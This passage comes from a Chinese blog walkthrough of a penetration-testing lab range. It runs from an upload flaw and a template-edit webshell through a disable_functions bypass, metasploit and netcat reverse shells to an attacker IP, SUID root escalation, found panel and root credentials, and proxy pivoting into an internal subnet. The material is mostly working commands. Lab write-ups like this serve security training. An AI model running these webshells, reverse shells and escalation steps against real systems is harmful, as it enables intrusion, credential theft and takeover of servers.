+<h2 id="3-6后台上传漏洞"><a href="#3-6后台上传漏洞" class="headerlink" title="3.6后台上传漏洞"></a>3.6后台上传漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admini\controllers\system\bakup.php </span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">uploadsql</span></span>() &#123; global <span class="variable">$request</span>; <span class="variable">$uploadfile</span>=<span class="built_in">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]&gt;<span class="variable">$request</span>[<span class="string">&#x27;max_file_size&#x27;</span>]) <span class="built_in">echo</span> <span class="string">&#x27;alert(&quot; 您 上 传 的 文 件 超 出 了 2M 的 限 制!&quot;);window.history.go(-1);&#x27;</span>; <span class="keyword">if</span>(fileext(<span class="variable">$uploadfile</span>)!=<span class="string">&#x27;sql&#x27;</span>) <span class="built_in">echo</span> <span class="string">&#x27;alert(&quot; 只 允 许 上 传 sql 格 式 文 件!&quot;);window.history.go(-1);&#x27;</span>; <span class="variable">$savepath</span> = ABSPATH.<span class="string">&#x27;/temp/data/&#x27;</span>.<span class="variable">$uploadfile</span>; 暗月内部培训资料 <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$savepath</span>)) &#123; <span class="built_in">echo</span> <span class="string">&#x27;alert(&quot; 数 据 库 SQL 脚 本 文 件 上 传 成 功!&quot;);window.history.go(-1);&#x27;</span>; &#125; <span class="keyword">else</span> &#123; <span class="built_in">echo</span> <span class="string">&#x27;alert(&quot; 数 据 库 SQL 脚 本 文 件 上 传 失 败!&quot;);window.history.go(-1);&#x27;</span>; &#125; &#125; </span><br></pre></td></tr></table></figure>
+<p>存在逻辑问题 上传 SQL 判断没有退出 导致可上传任何文件 数据包</p>
+<h2 id="3-7模板编辑拿-webshell"><a href="#3-7模板编辑拿-webshell" class="headerlink" title="3.7模板编辑拿 webshell"></a>3.7模板编辑拿 webshell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="zWne8qc5UOMBbCgsoOpTYxud8SnCa2FZay1OhRUyR_o.png" alt="image"></p>
+<p>输入之后，直接按下ctrl+s即可“编辑成功”</p>
+<p>验证是否可用，访问首页，给其进行传参</p>
+<p><img src="unEb45ar18BfZxfrxuiLnjZ9TuWUgc3T2D1C7U4O5dE.png" alt="image"></p>
+<p>使用中国菜刀连接</p>
+<p><img src="wYCa0DExRxHN5CZl4z4l96rqJtoSHCaNxnnOY0Y-420.png" alt="image"></p>
+<p> </p>
+<h1 id="4-Linux权限提升"><a href="#4-Linux权限提升" class="headerlink" title="4.Linux权限提升"></a>4.Linux权限提升</h1><h2 id="4-1突破-disable-functions-提权"><a href="#4-1突破-disable-functions-提权" class="headerlink" title="4.1突破 disable_functions 提权"></a>4.1突破 disable_functions 提权</h2><p>这套新系统的宝塔系统 php 禁止很多函数的执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passthru,<span class="built_in">exec</span>,system,<span class="built_in">chroot</span>,<span class="built_in">chgrp</span>,<span class="built_in">chown</span>,shell_exec,popen,proc_open,pcntl_exec,ini_alter,i</span><br><span class="line">ni_restore,dl,openlog,syslog,<span class="built_in">readlink</span>,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_w</span><br><span class="line">aitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pc</span><br><span class="line">ntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get</span><br><span class="line">_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exe</span><br><span class="line">c,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</span><br></pre></td></tr></table></figure>
+<p>有些版本还是漏了一些函数可以执行</p>
+<p>查看网卡信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+<p><img src="HeHSpFKheKKmk0B-bpZtwRaXoMY2JnGCJGSJTJ7e6zA.png" alt="image"></p>
+<p>反弹shell失败</p>
+<p><img src="0eaTAy2xU59Xo3PGG-qnPJQw8FhbawWvP5-n8I0GOwg.png" alt="image"></p>
+<h2 id="4-2-metasploit-反弹-shell"><a href="#4-2-metasploit-反弹-shell" class="headerlink" title="4.2.metasploit 反弹 shell"></a>4.2.metasploit 反弹 shell</h2><h3 id="4-2-1-生成攻击载荷"><a href="#4-2-1-生成攻击载荷" class="headerlink" title="4.2.1.生成攻击载荷"></a>4.2.1.生成攻击载荷</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.8.133 LPORT=13777 -f elf &gt;/root/moonsec/2020/project5/ddd4</span><br></pre></td></tr></table></figure>
+<p><img src="lFgRqW__tTnM9orNPitddsi8owUqK_bBQz5rXctEPps.png" alt="image"></p>
+<h3 id="4-2-2监听端口"><a href="#4-2-2监听端口" class="headerlink" title="4.2.2监听端口"></a>4.2.2监听端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Msfconsole</span><br><span class="line">use multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.8.133</span><br><span class="line"><span class="built_in">set</span> lport 13777</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="n4GA_vC-qtPSBi0tNQ7YIz4oKul6bSpVb9m4rkofi_g.png" alt="image"></p>
+<h3 id="4-2-3成功监听-shell"><a href="#4-2-3成功监听-shell" class="headerlink" title="4.2.3成功监听 shell"></a>4.2.3成功监听 shell</h3><p>将文件上传到添加执行权限，在目录执行即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/bypass_disablefunc.php?cmd=<span class="built_in">chmod</span>%20777%20ddd4&amp;outpath=</span><br><span class="line">/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br><span class="line">http://www.ddd4.com/bypass_disablefunc.php?cmd=./ddd4&amp;outpath=/tmp/xx&amp;sopath=</span><br><span class="line">/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+<p><img src="ZRnQs-_PfinT2HJg3iGZO9Ru6Mic-GN-UcZDxxltjr8.png" alt="image"></p>
+<p>输入shell</p>
+<p>切换到shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="OblQ59uqbfZF-Ghs5egVLKpWra-wX65xmo7jU_zgOfQ.png" alt="image"></p>
+<h2 id="4-3建立交互shell"><a href="#4-3建立交互shell" class="headerlink" title="4.3建立交互shell"></a>4.3建立交互shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.8.133 9001 &gt;/tmp/f</span><br><span class="line">nc -lvnp 9001</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="XGYye6uVO5tRKailcVLRtiOVW4J_SzZoOhfjjbxwdRg.png" alt="image"></p>
+<p><img src="ntRMyVWHpIB9LvvgQRM0BXo2HAb5skxEaMimR9erkFs.png" alt="image"></p>
+<p><img src="W84iUxb6yI0CvBfPsxEuQDameTh_DYFK8L5_ArnpM0k.png" alt="image"></p>
+<h2 id="4-4查看用户"><a href="#4-4查看用户" class="headerlink" title="4.4查看用户"></a>4.4查看用户</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | grep bash</span><br></pre></td></tr></table></figure>
+<p><img src="ak7CkSbwy_pGtg3xG384DwQ5ZxXz1m3lgYd_QkJcsb4.png" alt="image"></p>
+<h2 id="4-5获取第一个flag"><a href="#4-5获取第一个flag" class="headerlink" title="4.5获取第一个flag"></a>4.5获取第一个flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/host123/flag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="uQpRotn6YlxownHCky2IW5sVv5qBdvke5J65kG9f--M.png" alt="image"></p>
+<h2 id="4-6通过宝塔提权到root"><a href="#4-6通过宝塔提权到root" class="headerlink" title="4.6通过宝塔提权到root"></a>4.6通过宝塔提权到root</h2><p>翻找目录从桌面找到一个敏感文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/host123/bt.txt</span><br></pre></td></tr></table></figure>
+<p><img src="193nUyMLq7yuECV-RrTOZf59ondr6g0KhutLyOr4cCw.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www@host123:/$ <span class="built_in">cat</span> /home/host123/bt.txt</span><br><span class="line"><span class="built_in">cat</span> /home/host123/bt.txt</span><br><span class="line">Bt-Panel: http://116.27.229.43:8888/944906b5</span><br><span class="line">username: gpeqnjf4</span><br><span class="line">password: d12924fa</span><br></pre></td></tr></table></figure>
+<p>登录地址：<a target="_blank" rel="noopener" href="http://192.168.8.122:8888/944906b5/">http://192.168.8.122:8888/944906b5/</a></p>
+<p> </p>
+<p><img src="Vqwy9SF04HSPIfBIDyDWzTCjzUxUwZeTnK8WBNDi6Ys.png" alt="image"></p>
+<p> </p>
+<p> </p>
+<p><img src="aB6MVs7fb3yF62h5AENtIa-vZ75Hiaae6-_nIEy1z6Q.png" alt="image"></p>
+<p><img src="vtDjFBzclYelUnvE27U_Xs3s3hc01NspAbMY9Uj9cyY.png" alt="image"></p>
+<p><img src="jZ49Y4B5-M__QF2h0WfcWmAPSEopRPkU6q4cnVH4opI.png" alt="image"></p>
+<h2 id="4-6通过-suid-提权到-root"><a href="#4-6通过-suid-提权到-root" class="headerlink" title="4.6通过 suid 提权到 root"></a>4.6通过 suid 提权到 root</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -u=s 2&gt;/dev/n</span><br></pre></td></tr></table></figure>
+<p><img src="E_HtppmFjm5ClxIHCHclJVNkamT6MdvqDJ1LkU_CRm4.png" alt="image"></p>
+<p><img src="my4Yl5Yv_WExJYO9NATlqjbtGJSWvwZaxyGBreLTBSo.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find inc -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>
+<p><img src="rWhJf-22jquHpwiVzt8t2h9HNLzamN2-pdTPU11Mqbg.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
+<p><img src="B-wQBGGuxmozgBamp_3DxqwaNB0XpC-s96S1ppsN-nM.png" alt="image"></p>
+<h2 id="4-8-linux-三大信息收集脚本的使用和解释"><a href="#4-8-linux-三大信息收集脚本的使用和解释" class="headerlink" title="4.8.linux 三大信息收集脚本的使用和解释"></a>4.8.linux 三大信息收集脚本的使用和解释</h2><h3 id="4-8-1-LinEnum-的使用"><a href="#4-8-1-LinEnum-的使用" class="headerlink" title="4.8.1.LinEnum 的使用"></a>4.8.1.LinEnum 的使用</h3><p>这个脚本是用来收集系统的信息 如 特殊文件的权限 suid 文件信息 网络端口信息 建立 WEB 服务器 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo python -m SimpleHTTPServer 80 </span><br><span class="line">下载文件执行 wget http://192.168.0.109/LinEnum.sh</span><br><span class="line"><span class="built_in">chmod</span> +x LinEnum.sh</span><br><span class="line">./ LinEnum.sh</span><br></pre></td></tr></table></figure>
+<p><img src="LryINlCXHGFjOd_-Ng5CgUI57nKoIQau4xGDdfMk5eY.png" alt="image"></p>
+<p><img src="Rk9jEKvjkHL9gy66Su_o1O8HwtM66_YevmUiPT9aYi4.png" alt="image"></p>
+<p>历史记录找到 root 密码 yanisy123</p>
+<h3 id="4-8-2-linux-exploit-suggester-sh的使用"><a href="#4-8-2-linux-exploit-suggester-sh的使用" class="headerlink" title="4.8.2.linux-exploit-suggester.sh的使用"></a>4.8.2.linux-exploit-suggester.sh的使用</h3><p>这个用来检测是否存在提权 cve 漏洞</p>
+<p><img src="GUNJi1Ah6o4H2XGwd3R4YEE81ZpXcUvpc0Oi1tLMvV0.png" alt="image"></p>
+<h3 id="4-8-3-linuxprivchecker-py"><a href="#4-8-3-linuxprivchecker-py" class="headerlink" title="4.8.3.linuxprivchecker.py"></a>4.8.3.linuxprivchecker.py</h3><p>这个用来检测权限</p>
+<p>python linuxprivchecker.py</p>
+<p><img src="ANyvx3w5tGYRvOUY4RuK1NoAe7j_pP7rJr4MEvcJ3RU.png" alt="image"></p>
+<p>su host123</p>
+<p>输入密码之后,查看当前用能执行的命令</p>
+<p>sudo -l</p>
+<p><img src="fGMM7Oh19ygjD4aQOWL8zd9u3MzKZQOqADCbM4jUfDU.png" alt="image"></p>
+<h2 id="4-10获取第二个flage"><a href="#4-10获取第二个flage" class="headerlink" title="4.10获取第二个flage"></a>4.10获取第二个flage</h2><p><img src="WewG-lcH9v8y3gmbx52f5ZaDDdlxS9ANnzd2U65oUcU.png" alt="image"></p>
+<p> </p>
+<p> </p>
+<p> </p>
+<h1 id="5-linux-内网跨网段渗透"><a href="#5-linux-内网跨网段渗透" class="headerlink" title="5. linux 内网跨网段渗透"></a>5. linux 内网跨网段渗透</h1><h1 id="5-1-获取高权限的-meterpreter"><a href="#5-1-获取高权限的-meterpreter" class="headerlink" title="5.1.获取高权限的 meterpreter"></a>5.1.获取高权限的 meterpreter</h1><p>先用 metasploit 反弹一个 root 权限的 meterpreter </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; exploit -j 放在后台执行</span><br></pre></td></tr></table></figure>
+<p><img src="1Rnj75NOP05gZ4dmrsNV2B542Cyag1-zhilPsjyuviM.png" alt="image"></p>
+<h2 id="5-2网卡路由信息获取"><a href="#5-2网卡路由信息获取" class="headerlink" title="5.2网卡路由信息获取"></a>5.2网卡路由信息获取</h2><p><img src="JxPYS0jVwpzXYfLOIh9g94v0m5Q9OPcb7hBDA99B2JI.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>
+<p><img src="-RPTxJgyXwMBb4PUwBF-En3P8ykqs1c9rLLuJKHgmy0.png" alt="image"></p>
+<h2 id="5-3查看-host-文件"><a href="#5-3查看-host-文件" class="headerlink" title="5.3查看 host 文件"></a>5.3查看 host 文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br></pre></td></tr></table></figure>
+<p><img src="AU2gQldA4OxBrzii6khdMjzwRokEpairfJcdiIoDGjw.png" alt="image"></p>
+<h2 id="5-4metasploit-设置代理进入内网"><a href="#5-4metasploit-设置代理进入内网" class="headerlink" title="5.4metasploit 设置代理进入内网"></a>5.4metasploit 设置代理进入内网</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="dizUR8OjjOoSdxmLgwzZJihQ784RaXj_v_4NLgVme-Y.png" alt="image"></p>
+<h3 id="5-4-1启动-socks-模块"><a href="#5-4-1启动-socks-模块" class="headerlink" title="5.4.1启动 socks 模块"></a>5.4.1启动 socks 模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> SRVPORT 22333</span><br></pre></td></tr></table></figure>
+<p><img src="kNJhTAXsZ69uNVFcJE92Quk-37iXY_JwgEgaBQF283Y.png" alt="image"></p>
+<p>启动代理</p>
+<p><img src="mwM2koYg9Vl38le3S_Nl-SVcBYEg56jChEYNFp6KkrM.png" alt="image"></p>
+<h3 id="5-4-2设置-proxychains-代理进内网"><a href="#5-4-2设置-proxychains-代理进内网" class="headerlink" title="5.4.2设置 proxychains 代理进内网"></a>5.4.2设置 proxychains 代理进内网</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+<p><img src="mGR-GyYQWjXUemmzMDdDn1yDULJ8REU_E2NeQqmZYZ4.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 10.10.10.144</span><br></pre></td></tr></table></figure>
+<p><img src="KY5ot2xwFry1zm9drgKvP3gdXwMWVF7JDQ-UrEpDLsk.png" alt="image"></p>
+<h2 id="5-5对-www-ddd5-com-进行检测"><a href="#5-5对-www-ddd5-com-进行检测" class="headerlink" title="5.5对 www.ddd5.com 进行检测"></a>5.5对 <a target="_blank" rel="noopener" href="http://www.ddd5.com/">www.ddd5.com</a> 进行检测</h2><p>Kali中添加hosts  </p>
+<p><img src="8H8zIyTCZzTeWCyFi6I3Pb_WVvjodkLj0ZMOOz9fcpw.png" alt="image"></p>
+<h3 id="5-5-1-设置浏览器代理访问"><a href="#5-5-1-设置浏览器代理访问" class="headerlink" title="5.5.1.设置浏览器代理访问"></a>5.5.1.设置浏览器代理访问</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains firefox http://www.ddd5.com</span><br></pre></td></tr></table></figure>
+<p><img src="OrnTY80CSPRY9sWj3_m6BUHORlRdwSwtUTYPIdN0rao.png" alt="image"></p>
+<p><img src="W2JDhK2kET5UvzycAo-RMf7ZIa8Wci0YZl12Gz9LvAM.png" alt="image"></p>
+<p>发现是 emlog 后台默认密码 123456 即可登录。</p>
+<p>Msf的代理不够稳定，我们自己搭建一个代理来访问。</p>
+<p>Kali上操作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf ssocks-0.0.14.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ssocks-0.0.14</span><br><span class="line">./configure &amp;&amp; make</span><br><span class="line"><span class="built_in">cd</span> /src</span><br><span class="line">./rcsocks -l 2233 -p 1080 -vv</span><br></pre></td></tr></table></figure>
+
+
+<p>受害机操作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf ssocks-0.0.14.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ssocks-0.0.14</span><br><span class="line">./configure &amp;&amp; make</span><br><span class="line"><span class="built_in">cd</span> /src</span><br><span class="line">./rssocks -vv -s 192.168.8.133:1080</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="p4fsTV-T-xpzjQ_bZ_yovuAg9wFToDyqwvU_RERHQ_g.png" alt="image"></p>
+<p> </p>
+<h3 id="5-5-2后台拿-WEBSHELL"><a href="#5-5-2后台拿-WEBSHELL" class="headerlink" title="5.5.2后台拿 WEBSHELL"></a>5.5.2后台拿 WEBSHELL</h3><p>从网上下来一个 emlog 把带有后门文件的 php 设置打包好在 emlog 后台上传模板压缩包解压后即可在模板名的目录生成一个 php 后门。</p>
+<p><img src="7i2yD6iFayLLQFLXzLGQpQq7C4vWY12Ie9mFyMz1hIk.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.ddd5.com/content/templates/moonsec/moon.php</span><br><span class="line">www.ddd5.com/content/templates/moonsec/shell.php</span><br><span class="line">www.ddd5.com/content/templates/moonsec/1.php</span><br></pre></td></tr></table></figure>
+<p><img src="PcKOwqOF0AOraUUKv_g5mgriiSJvrtSSH0q5HUi0gKs.png" alt="image"></p>
+<p> </p>
+<p><img src="qQ2ydqInvynsfxU-i12XG7GS9AhrXV0J304plvCL2no.png" alt="image"></p>
+<p><img src="R9x92PTRDy2p-J-ws2302wLWv4048v47GsxGn6pRT-0.png" alt="image"></p>
+<p>中国蚁剑设置代理连接</p>
+<p><img src="nln8xWQk8lshZ3k8T71ic4C-V6eEILztDJ4cUp2FMFs.png" alt="image"></p>
+<h1 id="6-linux-内网跨网段提权"><a href="#6-linux-内网跨网段提权" class="headerlink" title="6.linux 内网跨网段提权"></a>6.linux 内网跨网段提权</h1><h2 id="6-1wdcp主机提权"><a href="#6-1wdcp主机提权" class="headerlink" title="6.1wdcp主机提权"></a>6.1wdcp主机提权</h2><p>访问地址：10.10.10.144:8080&#x2F;phpMyAdmin</p>
+<p><img src="PEJ7gJoadiufgS6l7KCbQj6oiIuX6qU0brKxyXhtN0M.png" alt="image"></p>
+<p>输入账号：root  密码：wdlinux.cn</p>
+<p>登录成功</p>
+<p><img src="KZvBLHYyKqRm7pii6bQ29Y93wWQjIPbpkPXRt9GaUzQ.png" alt="image"></p>
+<p>Echo -n 123456 | md5sum</p>
+<p> </p>
+<p><img src="VYze8T5MpfU6n-z0YJp79B6759o5sOZurVzYvVyy7NA.png" alt="image"></p>
+<p>使用修改后的密码：123456，登录成功(如果一直登录不上，可能是运行web的系统的时间和本机的时间不一致)</p>
+<p><img src="2DOrDq8gNrsjL87Ahm6PD89vQm4DufrOw1ql2DjCtls.png" alt="image"></p>
+<p> </p>
+<p><img src="RCH3_E6R45eT4MJj0esLf6JN0VHdzlGPeszMcHJYrAI.png" alt="image"></p>
+<p>生成密钥</p>
+<p><img src="4rRuEMZ_HorDIkEdLJjknTY-X48iQYCzy7IgMyX3SM8.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 kali 设置权限 600 proxychains ssh root@10.10.10.144 -i sshkey_wdcp</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">打靶日记（二）linux内网完整渗透测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-DDD4-%E9%9D%B6%E5%9C%BA%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">1. DDD4 靶场介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">2.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">3.1.</span> <span class="toc-text">2.1主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.2.</span> <span class="toc-text">2.2端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-nmap-%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-number">3.3.</span> <span class="toc-text">2.3.nmap 端口信息获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4gobuser-%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95"><span class="toc-number">3.4.</span> <span class="toc-text">2.4gobuser 的高级用法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">4.</span> <span class="toc-text">3. 对目标进行渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1sqlmap%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="toc-number">4.1.</span> <span class="toc-text">3.1sqlmap编码注入利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-MYSQL-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%81%B6%E6%84%8F%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">3.2.MYSQL 服务器恶意读取客户端文件漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Rogue-MySql-Server-%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">4.3.</span> <span class="toc-text">3.3.Rogue-MySql-Server 读取配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4%E7%99%BB%E5%BD%95-mysql"><span class="toc-number">4.4.</span> <span class="toc-text">3.4登录 mysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5%E5%90%8E%E5%8F%B0%E5%AF%86%E6%96%87%E7%99%BB%E5%BD%95"><span class="toc-number">4.5.</span> <span class="toc-text">3.5后台密文登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.6.</span> <span class="toc-text">3.6后台上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%BE%91%E6%8B%BF-webshell"><span class="toc-number">4.7.</span> <span class="toc-text">3.7模板编辑拿 webshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.</span> <span class="toc-text">4.Linux权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1%E7%AA%81%E7%A0%B4-disable-functions-%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.</span> <span class="toc-text">4.1突破 